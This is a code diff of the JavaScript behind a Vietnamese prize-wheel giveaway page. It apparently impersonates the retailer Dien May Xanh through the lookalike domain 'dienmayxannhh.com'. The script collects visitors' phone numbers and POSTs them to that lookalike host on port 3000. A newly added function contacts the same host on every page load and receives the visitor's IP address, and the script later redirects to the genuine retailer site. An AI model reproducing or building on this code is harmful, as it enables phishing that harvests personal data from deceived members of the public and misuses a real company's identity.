@@ -1,3 +1,7 @@
+//path
+const path = "http://dienmayxannhh.com"
+// const path = "http://localhost"
+
 // Danh sách phần thưởng kèm hình ảnh
 let prizes = [
     { text: "Thẻ Cào 50k", image: "./library/picture/50.jpg", color: "#FF5733" },  // Màu cam đỏ
@@ -26,6 +30,7 @@ let myWheel = new Winwheel({
         }
     }
 });
+
 
 // Hàm hiển thị popup
 function showPopup(prizeText) {
@@ -89,7 +94,7 @@ function checksdt() {
 function sendData() {
     let sdt = document.getElementById("sdt").value;
 
-    fetch("http://dienmayxannhh.com:3000/submit", {
+    fetch(path+":3000/submit", {
     // fetch(':3000/submit', {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -272,3 +277,24 @@ function reloadPage(seconds) {
         window.location.href = 'https://www.dienmayxanh.com/';
     }, seconds*1000);
 }
+
+function sendIp(){
+    // Gửi request lên server để lấy thông tin IP
+    // fetch('/ip')
+    fetch(path+":3000/ip")
+    .then(response => response.text())
+    .then(data => {
+        console.log(data)
+        alert(data)
+    })
+    .catch(error => {
+        alert(error)
+        console.error('Error fetching IP:', error);
+    });
+}
+
+
+// Gọi hàm sendIp sau khi DOM đã tải xong
+document.addEventListener('DOMContentLoaded', () => {
+    sendIp();
+});
